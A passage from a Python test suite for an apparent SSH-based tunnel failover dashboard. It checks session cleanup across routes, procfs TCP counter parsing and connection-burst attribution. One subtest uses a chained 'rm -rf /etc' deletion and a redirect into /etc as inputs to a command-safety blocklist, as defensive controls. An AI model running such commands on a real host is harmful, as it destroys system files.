        self.assertEqual(sorted(closed), ["foreign", "iran"], f"a preflight session was left open: {closed}")
        self.assertEqual(len(closed), 2, f"a session was closed twice: {closed}")
        self.assertEqual(opened, ["iran", "foreign"], opened)
        self.assertFalse(resp["body"].get("dry_run"), resp["body"])
        self.assertIn("legs", resp["body"], f"the route did not reach the engine: {resp['body']}")

        # The second host refuses: the session that did open is still closed. This is the #71 defect.
        resp = drive("/api/preflight", fail_on="foreign", live=True)
        self.assertEqual(closed, ["iran"],
                         f"the refusal lost the session that had already been opened: {closed}")
        self.assertEqual(resp["code"], 400)
        self.assertIn("could not connect", resp["body"].get("error", ""))

        # The first host refuses: nothing was opened, so nothing is closed. This is what calibrates the
        # counter - a `closed` list appended to unconditionally would pass the two cases above against a
        # route that closes nothing at all.
        resp = drive("/api/preflight", fail_on="iran", live=True)
        self.assertEqual(closed, [], f"a close was recorded for a session that was never opened: {closed}")
        self.assertIn("could not connect", resp["body"].get("error", ""))

        # A preview still opens nothing: moving `if not dry` inside the try must not have inverted it.
        resp = drive("/api/preflight")
        self.assertEqual(opened, [], "the dashboard opened a session for a dry run, which is the one thing "
                                    "this route's own comment promises it will not do")
        self.assertTrue(resp["body"].get("dry_run"), resp["body"])

        # ---- 3. /api/failover/check, same instrument. This route hands `dry_run=is_dry_run()` to the
        # opener instead of skipping the open, so even a preview builds two sessions; the mock connects
        # nothing. The difference between the two routes is recorded here, not quietly unified.
        resp = drive("/api/failover/check")
        self.assertEqual(opened, ["iran", "foreign"], opened)
        self.assertEqual(sorted(closed), ["foreign", "iran"], f"a health-check session was left open: {closed}")
        self.assertTrue(resp["body"].get("ok"), resp["body"])

        resp = drive("/api/failover/check", fail_on="foreign")
        self.assertEqual(closed, ["iran"], f"the health check stranded a session: {closed}")
        self.assertFalse(resp["body"].get("ok"))
        self.assertIn("could not connect", resp["body"].get("error", ""))

        # ---- 3b. /api/diagnostics (Phase 6): the fourth session-opening
        # route. Same instrument: both sessions closed on the happy path,
        # and a foreign failure still closes the Iranian session it had
        # already opened. The route answers from the sealed runners
        # without raising, so ok is asserted too.
        resp = drive("/api/diagnostics")
        self.assertEqual(opened, ["iran", "foreign"], opened)
        self.assertEqual(sorted(closed), ["foreign", "iran"],
                         f"a diagnostics session was left open: {closed}")
        self.assertTrue(resp["body"].get("ok"), resp["body"])

        resp = drive("/api/diagnostics", fail_on="foreign")
        self.assertEqual(closed, ["iran"], f"diagnostics stranded a session: {closed}")
        self.assertFalse(resp["body"].get("ok"))

        # This route reaches the checker through an *instance* (`checker = TunnelHealthChecker()`), so it
        # depends on `check_health` still being a `staticmethod` descriptor on the class. Two earlier tests
        # patch it and restored the plain function they had read off the attribute - which silently shifted
        # every argument by one for every later test, and surfaced here as "'SealedRunner' object has no
        # attribute 'get'" in full-suite order while passing alone. The invariant is pinned, and the wrong
        # descriptor is executed rather than described.
        self.assertIsInstance(failover.TunnelHealthChecker.__dict__["check_health"], staticmethod,
                              "check_health is no longer a staticmethod, so an instance call injects self "
                              "as ir_runner - a test that patched it restored the function instead of the "
                              "descriptor")

        class _Probe:
            @staticmethod
            def check_health(ir_runner, fr_runner, pair, active_protocol, base_rtt=0.0, dry_run=False):
                # Same arity and the same first read as the real checker, because both are what make the
                # shift land on `.get` instead of raising TypeError at the call.
                return (pair.get("id", 1), active_protocol, dry_run)

        good = _Probe().check_health("IR", "FR", {"id": 7}, "GRE")
        self.assertEqual(good, (7, "GRE", False), good)
        # The same call against the unwrapped function, which is what the leaked restore produced: self is
        # absorbed as `ir_runner`, and `pair` ends up holding the third argument.
        _Probe.check_health = _Probe.__dict__["check_health"].__func__
        with self.assertRaises(AttributeError) as shifted:
            _Probe().check_health("IR", "FR", {"id": 7}, "GRE")
        self.assertIn("has no attribute 'get'", str(shifted.exception),
                      "the control no longer reproduces the shift, so the descriptor pin above is not "
                      "guarding anything real")

        # ---- 4. The source pins, last so a mutation of the product code shows up as a behavioural red
        # first. Counted census: exactly four routes in `do_POST` open sessions, and all four carry the
        # guard, so a fifth route added later cannot inherit the leak by copy-paste and stay uncovered.
        post_src = inspect.getsource(dashboard.H.do_POST)
        self.assertEqual(post_src.count("get_ssh_runner("), 8,
                         "a fifth route now opens sessions; it is not covered by this test or by the "
                         "shape pins below")
        for route in ("/api/preflight", "/api/resources", "/api/failover/check",
                      "/api/diagnostics"):
            seg = post_src.split(f'self.path == "{route}"')[1].split("elif self.path")[0]
            # `get_ssh_runner(full_pair` and not `get_ssh_runner`: a comment in the route names the
            # function, and an index pin that lands on prose compares the wrong pair of positions.
            self.assertGreater(seg.index("get_ssh_runner(full_pair"), seg.index("\n                try:"),
                               f"{route} opens a session before the try that guards it")
            self.assertIn("for r in (ir_runner, fr_runner):", seg,
                          f"{route} closes its sessions by hand-written name, so a None from a refused "
                          f"open raises AttributeError past the closer")
            self.assertIn("ir_runner = fr_runner = None", seg,
                          f"{route} has no None-init to fall back on when the first open raises")

        # The pins must be able to fail, and the way they fail is the point of the whole round: the two
        # opens moved below the `try`, so re-spelling them above it has to invert the comparison rather
        # than leave it satisfied. Executed on text, not asserted about it.
        preflight_seg = post_src.split('self.path == "/api/preflight"')[1].split("elif self.path")[0]
        # Both spellings are rebuilt from the shipped file's own indentation rather than hand-typed, so
        # the seal mutates what is actually there.
        shipped = ('                try:\n'
                   '                    if not dry:\n'
                   '                        ir_runner = get_ssh_runner(full_pair["iran"], dry_run=False, '
                   'host_role="iran")\n'
                   '                        fr_runner = get_ssh_runner(full_pair["foreign"], dry_run=False, '
                   'host_role="foreign")')
        old_shape_text = ('                if not dry:\n'
                          '                    ir_runner = get_ssh_runner(full_pair["iran"], dry_run=False, '
                          'host_role="iran")\n'
                          '                    fr_runner = get_ssh_runner(full_pair["foreign"], dry_run=False, '
                          'host_role="foreign")\n'
                          '                try:')
        self.assertIn(shipped, preflight_seg, "the pinned preflight shape drifted")
        hoisted_seg = preflight_seg.replace(shipped, old_shape_text, 1)
        self.assertNotEqual(hoisted_seg, preflight_seg, "reverting the shape changed nothing, so no pin "
                                                        "in this section can see the defect")
        self.assertLess(hoisted_seg.index("get_ssh_runner(full_pair"),
                        hoisted_seg.index("\n                try:"),
                        msg="the order pin accepts the pre-#71 shape, so it was never a pin")
        self.assertIn(old_shape_text, hoisted_seg)
        self.assertNotIn(old_shape_text, preflight_seg, "the pre-#71 shape is back in /api/preflight")

        # ---- 5. The refusal body carries no address. `/api/failover/check` is the one route of the three
        # that builds its response by hand rather than through `mask_tree`, so this is the leak surface.
        blob = json.dumps(resp["body"], ensure_ascii=False)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blob), [], blob[:200])
        self.assertNotIn(ir, blob)
        self.assertNotIn(fr, blob)

    # ---- #70: connection-burst attribution from the kernel's own counters -------------------------

    def _forget_host_rows(self, pid):
        """Drop every capacity row for one pair, and prove they are gone.

        These tests write real rows to the suite's database; leaving them behind would feed the next test a
        history it did not ask for, which is the exact failure mode of a test that reads `NO_BURSTS` from
        some other test's samples.
        """
        with storage.db_session() as conn:
            conn.execute("DELETE FROM host_resources WHERE pair_id = ?", (pid,))
        self.assertEqual(storage.host_resource_history(pid), [],
                         f"rows for pair {pid} survived the cleanup, so the next assertion in this test "
                         f"is reading someone else's history")

    def test_99_the_connection_counter_parsers_keep_an_unread_counter_unread(self):
        """#70 Acceptance Test (round 063, closing open finding #64): the counter readers themselves.

        Report062 could only attribute Foreign's episodic bursts by an operator who happened to be SSHed in
        during one, reading `TcpExt:TCPTimeouts=4643` and five SYN-RECV sockets off `ss` by hand. The three
        new sources are that reading made durable, and they carry the same discipline the six older ones
        were built on: a counter this kernel does not have is stored as *absent*, never as zero, because a
        zero AttemptFails and an unread AttemptFails go on to author opposite burst verdicts.

        Every claim here is run against procfs text, and each is mutated to show it can go red - including
        the label match, where borrowing the listen queue's numbers for the connection counters would be
        silent, arithmetic-looking wrong.
        """
        names = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS]
        cmds = [c for _, c in engine.RESOURCE_SAMPLE_COMMANDS]

        # ---- 1. Census and inertness of what was added. Nothing was widened to let these through.
        self.assertEqual(names[:6], ["load", "cpu_count", "memory", "disk", "uptime", "boot_id"],
                         "an existing source was renamed or reordered; the attribution and the panel both "
                         "key on this order")
        self.assertEqual(names[6:], ["tcp", "tcp_ext", "sockets"])
        for name, cmd in engine.RESOURCE_SAMPLE_COMMANDS[6:]:
            self.assertTrue(cmd.startswith("cat "), f"{name}: {cmd!r} is not a single-file read")
            self.assertNotIn(";", cmd, f"{name}: a chained command is not one read")
            self.assertNotIn("|", cmd, f"{name}: a pipe would put parsing outside the classifier's view")
            self.assertTrue(safety.check_command_safe(cmd),
                            f"{name}: {cmd!r} does not pass the gate that guards a deploy (#53)")
            self.assertTrue(safety.is_read_only_command(cmd),
                            f"{name}: {cmd!r} is not classifiable as inert, so a dropped session could not "
                            f"re-issue it")
        with self.subTest(control="the two gates catch different shapes, and the census says which one"):
            # `check_command_safe` is a destructive-token blocklist, so a bare redirect passes it. The gate
            # that refuses `cat X > /etc/dump` is `is_read_only_command`; naming the wrong one here would
            # have recorded a block that does not exist.
            self.assertFalse(safety.is_read_only_command("cat /proc/net/tcp > /etc/dump"),
                             "a redirect was classified as an inert read")
            self.assertTrue(safety.check_command_safe("cat /proc/net/tcp > /etc/dump"),
                            "both gates now refuse a redirect, so this control is no longer the pair of "
                            "gates the loop above exercises - rewrite the comment")
            self.assertFalse(safety.check_command_safe("cat /proc/net/tcp; rm -rf /etc"),
                             "the blocklist stopped catching a chained deletion")

        SNMP = ("Ip: InReceives InDelivers OutRequests\nIp: 9123450 9123401 8990123\n"
                "Tcp: RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens AttemptFails "
                "EstabReseds CurrEstab InSegs OutSegs RetransSegs OutRsts\n"
                "Tcp: 1 200 120000 -1 187432 93021 4102 3155 47 8123456 7990123 4211 887\n")
        NETSTAT = ("TcpExt: SyncookiesSent TCPTimeouts TCPSynRetrans ListenOverflows ListenDrops\n"
                   "TcpExt: 0 4643 612 0 0\n")

        # ---- 2. The label is the whole identity of a block.
        self.assertEqual(engine._procfs_counter_block(SNMP, "Tcp:")["ActiveOpens"], "187432")
        self.assertIsNone(engine._procfs_counter_block(SNMP, "TcpExt:"),
                          "a TcpExt: block was found inside /proc/net/snmp text - the counters would be "
                          "read out of the wrong subsystem")
        self.assertIsNone(engine._procfs_counter_block(NETSTAT, "Tcp:"),
                          "a Tcp: block was found inside /proc/net/netstat text")
        self.assertIsNone(engine._procfs_counter_block("Tcp: A B C\n", "Tcp:"),
                          "a header with no value line was paired with nothing")
        self.assertIsNone(engine._procfs_counter_block("Tcp: A B C\nTcp: 1 2\n", "Tcp:"),
                          "a 3-name header was zipped onto 2 values - positional pairing must refuse "
                          "rather than shift every counter by one")
        self.assertIsNone(engine._procfs_counter_block("TcpExt2: A B\nTcpExt2: 1 2\n", "TcpExt:"),
                          "exact-label matching degraded into a prefix match")

        # ---- 3. tcp / tcp_ext parse states.
        f, st = engine.parse_resource_reading("tcp", SNMP)
        self.assertEqual(st, "measured")
        self.assertEqual(f["ActiveOpens"], 187432)
        self.assertEqual(f["OutRsts"], 887)
        f, st = engine.parse_resource_reading("tcp_ext", NETSTAT)
        self.assertEqual((st, f["TCPTimeouts"], f["ListenDrops"]), ("measured", 4643, 0),
                         "report062's hand reading of 4643 is the value this instrument was built to "
                         "capture; it has to survive the parser unchanged")
        f, st = engine.parse_resource_reading("tcp_ext", "TcpExt: TCPTimeouts ListenDrops\n"
                                                         "TcpExt: 4643 -\n")
        self.assertEqual(st, "partial", "a non-numeric field made this a complete read")
        self.assertEqual(f["TCPTimeouts"], 4643)
        self.assertIsNone(f["ListenDrops"], "an unread counter was coerced to a value")
        f, st = engine.parse_resource_reading("tcp_ext", "TcpExt: TCPTimeouts\nTcpExt: 12\n")
        self.assertEqual(st, "partial")
        self.assertIsNone(f["ListenDrops"], "a counter the kernel did not print became a counter that "
                                           "read as zero - the collapse the whole nullable design exists "
                                           "to prevent")
        for body, rc, err_text, want in (("", 0, "", "empty"), ("", 1, "No such file or directory",
                                                          "absent"), ("nonsense\n", 0, "", "unparsed"),
                                         (SNMP, 1, "cat: permission denied", "failed")):
            self.assertEqual(engine.parse_resource_reading("tcp", body, rc, err_text)[1], want,
                             f"tcp reading of {body[:18]!r} rc={rc} judged wrong")

        # ---- 4. The socket table is a histogram, and the addresses do not survive it.
        TABLE = ("  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  "
                 "timeout inode\n"
                 "   0: 00000000:1F90 00000000:0000 0A 0:0 0 0 0 0 40211 1 0\n"
                 "   1: 0100007F:1F90 0100007F:D4A2 01 0:0 0 0 0 0 48122 1 0\n"
                 "   2: 0100007F:1F90 0100007F:D4A3 01 0:0 0 0 0 0 48123 1 0\n"
                 "   3: 0100007F:1F90 0100007F:D4A4 03 0:0 0 0 0 0 48124 1 0\n"
                 "   4: 0100007F:D4A2 0100007F:1F90 06 0:0 0 0 0 0 0 1 0\n"
                 "   5: 0100007F:D4A9 0100007F:1F90 77 0:0 0 0 0 0 0 1 0\n")
        f, st = engine.parse_resource_reading("sockets", TABLE)
        self.assertEqual(st, "measured")
        self.assertEqual(f["socket_states"], {"LISTEN": 1, "ESTABLISHED": 2, "SYN_RECV": 1,
                                              "TIME_WAIT": 1},
                         f"state histogram wrong: {f['socket_states']}")
        self.assertEqual(f["socket_rows"], 5, "the unknown state code was counted as a socket")
        self.assertEqual(f["socket_truncated"], False)
        blob = json.dumps(f, ensure_ascii=False)
        self.assertNotIn("0100007F", blob, "a hex peer address was kept in the reading")
        # Empty-but-headed is a reading; headless is not.
        self.assertEqual(engine.parse_resource_reading("sockets", "  sl  local_address st\n")[1],
                         "measured", "an empty table with a header is 'nothing is connected', which is a "
                                     "fact about the host")
        self.assertEqual(engine.parse_resource_reading("sockets", "garbage lines here\n")[1], "unparsed",
                         "a table with no header was reported as an empty one - 'cannot see the sockets' "
                         "and 'no sockets' must not print the same")
        self.assertEqual(engine.parse_resource_reading("sockets", "", 1,
                                                       "No such file or directory")[1], "absent")
        f, st = engine.parse_resource_reading("sockets", TABLE, 1, "cat: /proc/net/tcp6: No such file")
        self.assertEqual(st, "partial", "one of the two paths failing must not read as a whole-table read")
        saved_limit = engine.SOCKET_SCAN_LIMIT
        try:
            engine.SOCKET_SCAN_LIMIT = 3
            f = engine.parse_resource_reading("sockets", TABLE)[0]
            self.assertTrue(f["socket_truncated"], "a table past the scan limit was read as complete")
            self.assertEqual(engine.parse_resource_reading("sockets", TABLE)[1], "partial",
                             "a truncated count was reported as a measurement of the whole table")
        finally:
            engine.SOCKET_SCAN_LIMIT = saved_limit

        # ---- 5. resource_row: only usable sources contribute, and `reachable` is derived not assumed.
        readings = {n: {"state": "measured"} for n in names}
        readings["tcp"].update({"ActiveOpens": 10, "PassiveOpens": 20, "AttemptFails": 1,
                                "EstabReseds": 0, "InSegs": 0, "OutSegs": 0, "RetransSegs": 0,
                                "OutRsts": 0, "CurrEstab": 47})
        readings["tcp_ext"].update({"ListenOverflows": 0, "ListenDrops": 0, "TCPTimeouts": 4643,
                                    "TCPSynRetrans": 9})
        readings["sockets"].update({"socket_states": {"ESTABLISHED": 3, "SYN_RECV": 5},
                                    "socket_rows": 8, "socket_truncated": False})
        row = engine.resource_row(3, "foreign", readings)
        self.assertEqual(row["tcp_counters"]["TCPTimeouts"], 4643)
        self.assertEqual(row["tcp_counters"]["ActiveOpens"], 10)
        self.assertEqual(row["socket_states"], {"ESTABLISHED": 3, "SYN_RECV": 5})
        self.assertEqual(row["estab_conns"], 3, "estab_conns did not come from the socket gauge")
        self.assertEqual(row["tcp_counters"]["CurrEstab"], 47,
                         "the /proc/net/snmp gauge was overwritten by the socket histogram - the two are "
                         "kept apart because they come from different files and disagree by design")
        self.assertEqual(row["reachable"], 1)
        with self.subTest(control="one failed source still leaves the others in the row"):
            broken = dict(readings)
            broken["tcp_ext"] = {"state": "failed", "cmd": "cat /proc/net/netstat", "rc": -1}
            r2 = engine.resource_row(3, "foreign", broken)
            self.assertEqual(r2["tcp_counters"].get("TCPTimeouts"), None,
                             "a failed source contributed a counter to the row")
            self.assertEqual(r2["tcp_counters"].get("ActiveOpens"), 10)
            self.assertEqual(r2["reachable"], 1)
        with self.subTest(control="nothing usable is reachable=0, not a row of zeros"):
            none_ok = engine.resource_row(3, "foreign", {n: {"state": "failed"} for n in names})
            self.assertEqual(none_ok["reachable"], 0)
            self.assertIsNone(none_ok["estab_conns"])
            self.assertEqual(none_ok["tcp_counters"], {})
            self.assertEqual(set(none_ok["source_states"]), set(names))

        # ---- 6. A session that dies is recorded as unreachable, not as an exception that escapes.
        class DyingRunner:
            host_role = "foreign"

            def run(self, cmd, **kw):
                raise TimeoutError(f"channel to 203.0.113.20 died at 17:05 ({cmd[:12]})")

        sample = engine.collect_host_resources(DyingRunner(), 3, "foreign", dry_run=False)
        self.assertFalse(sample["ok"])
        self.assertEqual(sample["row"]["reachable"], 0)
        self.assertEqual({s["state"] for s in sample["readings"].values()}, {"failed"},
                         "a raising session produced something other than a per-source 'failed' verdict")
        detail = sample["readings"]["tcp"]["detail"]
        self.assertIn("TimeoutError", detail)
        self.assertNotIn("203.0.113.20", detail, "the runner's host-prefixed failure text carried the "
                                                "address into the stored detail field (#28)")
        with self.subTest(control="the shipped loop is the one that survived - an unguarded loop raises"):
            # The pre-fix shape: no per-source try, so the first TimeoutError escapes and the caller stores
            # no row at all. Executed rather than asserted-about-in-a-comment.
            unguarded = {}
            with self.assertRaises(TimeoutError):
                for _name, _cmd in engine.RESOURCE_SAMPLE_COMMANDS:
                    unguarded[_name] = DyingRunner().run(_cmd)
            self.assertEqual(unguarded, {}, "the control did not even reach the first source, so it proves "
                                           "nothing about the second")
            self.assertEqual(len(sample["readings"]), len(names),
                             "the shipped sampler stopped at the first failure instead of reporting all "
                             "nine as unread")

        # ---- 7. The test double answers the new sources, and can starve each one on its own.
        full = engine.collect_host_resources(mock_ssh.MockSSHClient(host_role="foreign"), 3, "foreign",
                                             dry_run=False)
        self.assertTrue(full["ok"], full["summary"])
        self.assertEqual(full["row"]["tcp_counters"]["TCPTimeouts"], 4643)
        self.assertEqual(full["row"]["socket_states"]["LISTEN"], 2)
        for starved in ("tcp", "tcp_ext", "sockets"):
            state = {"resources": {"absent": [starved]}}
            s = engine.collect_host_resources(mock_ssh.MockSSHClient(state, "foreign"), 3, "foreign",
                                              dry_run=False)
            self.assertEqual(s["readings"][starved]["state"], "absent",
                             f"mock could not starve {starved} alone")
            usable = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS
                      if s["readings"][n]["state"] in engine.RESOURCE_USABLE]
            self.assertEqual(len(usable), len(names) - 1,
                             f"starving {starved} changed the verdict of another source")
            self.assertEqual(s["row"]["reachable"], 1, "one unreadable source made the host look down")

    def test_100_burst_attribution_uses_differences_and_declines_every_unusable_interval_by_name(self):
        """#70 Acceptance Test: the attribution itself - arithmetic, order, and the refusals.

        Three properties carry this function. Deltas come from *consecutive* samples in time order, so a
        caller that hands rows newest-first must not be able to produce a negative connection count. A
        counter that moved backwards is a restarted kernel, not quiet traffic. And a sample from a host that
        answered nothing bounds nothing - reading it as "zero connections in this interval" is precisely how
        a reboot window would turn into a reported idle night, which is the window ruling 3 is about to
        create on purpose.
        """
        def counters(ao=0, po=0, af=0, to=0, sr=0, lo=0, est=5):
            return {"ActiveOpens": ao, "PassiveOpens": po, "AttemptFails": af, "EstabReseds": 0,
                    "InSegs": 100 + ao, "OutSegs": 90 + po, "RetransSegs": 0, "OutRsts": 0,
                    "ListenOverflows": lo, "ListenDrops": 0, "TCPTimeouts": to, "TCPSynRetrans": sr,
                    "CurrEstab": est}

        def row(at, ao=0, po=0, af=0, to=0, sr=0, lo=0, est=5, syn=0, tw=0, reach=1, boot="b1",
                with_counters=True):
            return {"pair_id": 4, "host_role": "foreign", "collected_at": float(at), "boot_id": boot,
                    "reachable": reach,
                    "tcp_counters": json.dumps(counters(ao, po, af, to, sr, lo, est))
                                    if with_counters else "",
                    "socket_states": json.dumps({"ESTABLISHED": est, "SYN_RECV": syn, "TIME_WAIT": tw,
                                                 "LISTEN": 2}) if with_counters else "",
                    "source_states": "{}"}

        quiet = [row(1000 + i * 60, ao=6 * i, po=6 * i) for i in range(8)]

        # ---- 1. A clean history with one burst in it, and the arithmetic checked by hand.
        burst = quiet + [row(1480, ao=6 * 7 + 240, po=6 * 7 + 40, af=4, to=90, sr=120, lo=0, est=9,
                             syn=5, tw=30)]
        got = engine.attribute_connection_bursts(list(reversed(burst)), role="foreign",
                                                 now_sec=1500.0, stale_after_sec=180.0)
        self.assertEqual(got["samples"], 9)
        self.assertEqual(len(got["intervals"]), 8)
        self.assertEqual(got["burst_count"], 1, f"expected exactly one burst: {got['summary']}")
        b = got["bursts"][0]
        self.assertEqual(b["new_connections"], 280, "the burst delta is not inbound+outbound over the "
                                                   "interval it was measured on")
        self.assertEqual(b["span_sec"], 60.0)
        self.assertAlmostEqual(b["rate_per_sec"], 280 / 60.0, places=3)
        # Hand-computed median of the seven quiet intervals: each adds 12 connections over 60 s = 0.2/s,
        # and the eighth interval is the burst's. With an even count the median is the mean of the middle
        # two, which is still 0.2 because every quiet rate is identical.
        self.assertAlmostEqual(got["baseline"]["median_new_conn_per_sec"], 0.2, places=3,
                               msg=f"baseline drifted: {got['baseline']}")
        self.assertTrue(got["baseline"]["available"])
        # Hand-computed: the burst interval adds 240 ActiveOpens and 40 PassiveOpens, so the host dialled
        # out four times more than it was dialled. `outbound_storm` is the whole point of separating the two
        # directions - "the world is hammering this host" and "this host has a client gone feral" are fixed
        # by different things, and report062 could not tell them apart at all.
        self.assertEqual(b["cause"], "outbound_storm", f"direction split wrong: {b}")
        self.assertIn("vs own median", b["basis"])
        self.assertEqual(got["verdict"], "BURSTS(1)", got["summary"])
        self.assertEqual(got["stale"], False)
        self.assertEqual(got["totals"]["new_connections"], 7 * 12 + 280)
        self.assertEqual([i for i in got["intervals"] if (i["new_connections"] or 0) < 0], [],
                         "a negative interval appeared - the rows were not re-sorted into time order")

        # ---- 2. Order-insensitivity, executed rather than asserted about.
        asc = engine.attribute_connection_bursts(burst, role="foreign")
        newest_first = list(reversed(burst))
        desc = engine.attribute_connection_bursts(newest_first, role="foreign")
        self.assertEqual(asc["bursts"], desc["bursts"], "the same history read in two orders produced two "
                                                       "different bursts")
        with self.subTest(control="a caller-side zip on unsorted rows does produce the wrong sign"):
            naive = []
            for prev, cur in zip(newest_first, newest_first[1:]):
                pc = json.loads(prev["tcp_counters"])
                cc = json.loads(cur["tcp_counters"])
                naive.append((cc["PassiveOpens"] + cc["ActiveOpens"])
                             - (pc["PassiveOpens"] + pc["ActiveOpens"]))
            self.assertTrue(any(n < 0 for n in naive),
                            "the control produced no negative delta, so it does not demonstrate the "
                            "ordering hazard the shipped sort defends against")

        # ---- 3. Every refusal has a name, and the names are the ones that matter.
        cases = {
            "boot_between_samples": [row(1000, po=0, boot="b1"), row(1060, po=50000, boot="b2")],
            "host_unreachable": [row(1000, po=0), row(1060, po=1000, reach=0), row(1120, po=1002)],
            "counter_reset": [row(1000, po=900), row(1060, po=10)],
            "no_counters": [row(1000, po=0), row(1060, po=5000, with_counters=False)],
            "non_monotonic_clock": [row(1000, po=0), row(1000, po=500)],
        }
        for reason, rows in cases.items():
            out = engine.attribute_connection_bursts(rows, role="foreign")
            self.assertIn(reason, out["skipped_counts"],
                          f"{reason}: the interval was used or refused under a different name - "
                          f"{out['summary']}")
        # A reset handed over in descending time order still reads as a reset: the sort fixes the sign and
        # the monotonic check still fires, which is the pair of properties that make the sort safe.
        rev = engine.attribute_connection_bursts(list(reversed(cases["counter_reset"])), role="foreign")
        self.assertIn("counter_reset", rev["skipped_counts"], rev["summary"])
        # A row written before migration 10 carries reachable NULL, meaning "this column did not exist".
        # Refusing it as `host_unreachable` would report an outage for a week of healthy history, so the
        # refusal has to be the honest one: no counters on this side.
        legacy_row = {"pair_id": 4, "host_role": "foreign", "collected_at": 1060.0, "reachable": None,
                      "boot_id": "b1", "tcp_counters": None, "socket_states": None, "source_states": None}
        lg = engine.attribute_connection_bursts([row(1000, po=0), legacy_row], role="foreign")
        self.assertIn("no_counters", lg["skipped_counts"], lg["summary"])
        self.assertNotIn("host_unreachable", lg["skipped_counts"],
                         "a pre-migration row was reported as a host that answered nothing")
        # The same row as the *earlier* of a pair: the interval survives, but with no counters behind it it
        # contributes nothing to the total and is counted as uncounted rather than as a zero.
        prev_legacy = engine.attribute_connection_bursts(
            [dict(legacy_row, collected_at=1000.0), row(1060, po=50)], role="foreign")
        self.assertNotIn("host_unreachable", prev_legacy["skipped_counts"], prev_legacy["summary"])
        self.assertEqual(prev_legacy["totals"]["new_connections"], 0,
                         "a counter that was never read on one side was counted as traffic")
        self.assertEqual(prev_legacy["totals"]["intervals_without_counter"], 1, prev_legacy["summary"])
        with self.subTest(control="treating an unreachable sample as a quiet one would invent a drop"):
            un = cases["host_unreachable"]
            as_if_zero = json.loads(un[1]["tcp_counters"])["PassiveOpens"] - json.loads(un[0]["tcp_counters"])["PassiveOpens"]
            self.assertEqual(as_if_zero, 1000, "the control's arithmetic is not what the refusal prevents")
            self.assertEqual(engine.attribute_connection_bursts(un, role="foreign")
                             ["totals"]["new_connections"], 0,
                             "the unreachable interval was counted after all")

        # ---- 4. The dark window end to end: a boot, an unreachable gap, and recovery.
        window = ([row(1000 + i * 60, po=10 * i, ao=10 * i) for i in range(4)]
                  + [row(1240 + i * 60, reach=0, with_counters=False) for i in range(3)]
                  + [row(1420 + i * 60, po=0, ao=0, boot="b2") for i in range(3)])
        w = engine.attribute_connection_bursts(window, role="foreign", now_sec=1560.0,
                                               stale_after_sec=180.0)
        self.assertEqual(w["skipped_counts"].get("host_unreachable"), 3, w["summary"])
        self.assertEqual(w["skipped_counts"].get("boot_between_samples"), 1, w["summary"])
        self.assertTrue(all(i["new_connections"] is None or i["new_connections"] >= 0
                            for i in w["intervals"]))
        self.assertLess(w["totals"]["new_connections"], 400,
                        "the counters that restarted at boot were counted as traffic across the window")

        # ---- 5. No baseline is said out loud, never guessed at.
        short = engine.attribute_connection_bursts(quiet[:2], role="foreign")
        self.assertIn("UNCALIBRATED", short["verdict"], short["summary"])
        self.assertFalse(short["baseline"]["available"])
        self.assertEqual(short["baseline"]["min_intervals"], engine.CONN_MIN_BASELINE_INTERVALS)
        self.assertIsNone(short["baseline"]["median_new_conn_per_sec"])
        self.assertEqual(short["baseline"]["intervals_with_rate"], 1,
                         "how many rates exist is hidden along with the median that is not trusted yet")
        # With no baseline a spike is labelled by the floor alone: the panel must not print "vs own median"
        # for a median the engine refused to publish.
        spike = engine.attribute_connection_bursts([row(1000, po=0), row(1060, po=200)], role="foreign")
        self.assertIn("UNCALIBRATED", spike["verdict"], spike["summary"])
        self.assertEqual(spike["bursts"][0]["basis"], "absolute floor of "
                         f"{engine.CONN_MIN_BURST_CONNECTIONS} new connections (no baseline yet)",
                         spike["bursts"][0]["basis"])
        self.assertNotIn("median", spike["bursts"][0]["basis"])
        empty = engine.attribute_connection_bursts([], role="foreign")
        self.assertEqual(empty["verdict"], "NO_HISTORY")
        self.assertIsNone(empty["window"])
        self.assertEqual(empty["intervals"], [])
        with self.subTest(control="a below-floor spike is NO_BURSTS, so the gate can say no"):
            # 8 + 8 = 16 new connections: above the host's own median rate, below CONN_MIN_BURST_CONNECTIONS,
            # so the floor and not the baseline is what says no. A fixture at 20+20 would have been a burst.
            below = quiet + [row(1480, ao=6 * 7 + 8, po=6 * 7 + 8)]
            nb = engine.attribute_connection_bursts(below, role="foreign")
            self.assertEqual(nb["totals"]["new_connections"], 7 * 12 + 16)
            self.assertEqual(nb["verdict"], "NO_BURSTS", nb["summary"])
            self.assertEqual(nb["bursts"], [])
        # An above-floor interval that is merely the host's normal rate is not a burst either: this is the
        # difference between an absolute threshold and a self-baseline, which is the ruling's point.
        busy = [row(1000 + i * 60, ao=100 * i, po=100 * i) for i in range(9)]
        bb = engine.attribute_connection_bursts(busy, role="foreign")
        self.assertEqual(bb["verdict"], "NO_BURSTS",
                         f"a host at a steady high rate was flagged as bursting: {bb['summary']}")
        self.assertGreater(bb["totals"]["new_connections"], 1000)

        # ---- 6. Cause ordering is a claim about causes, so each cause is produced and the ties checked.
        def one_cause(**kw):
            base = dict(new_connections=200, inbound=100, outbound=100, attempt_fails=0,
                        listen_overflows=0, listen_drops=0, tcp_timeouts=0, syn_retrans=0,
                        retrans_segs=0)
            base.update(kw)
            return engine._burst_cause(base)

        self.assertEqual(one_cause(listen_overflows=3), "accept_queue_overflow")
        self.assertEqual(one_cause(listen_drops=1, attempt_fails=190), "accept_queue_overflow",
                         "the queue's own verdict was outranked by a handshake ratio - an overflow is the "
                         "service failing to absorb, which is a different fix")
        self.assertEqual(one_cause(attempt_fails=150), "failed_handshakes")
        self.assertEqual(one_cause(attempt_fails=20, tcp_timeouts=400), "retransmit_growth")
        self.assertEqual(one_cause(inbound=5, outbound=195), "outbound_storm")
        self.assertEqual(one_cause(inbound=195, outbound=5), "inbound_storm")
        self.assertEqual(one_cause(), "inbound_storm")
        self.assertEqual(engine._burst_cause({"new_connections": None, "inbound": None,
                                              "outbound": None}), "unattributed")

        # ---- 7. The counter reader never coerces.
        for bad in (None, "", "abc", True, False, 3.5, [], {}):
            self.assertIsNone(engine._counter_int(bad), f"_counter_int coerced {bad!r}")
        self.assertEqual(engine._counter_int("42"), 42)
        self.assertEqual(engine._counter_int(42), 42)
        self.assertEqual(engine._median([3, 1, 2]), 2)
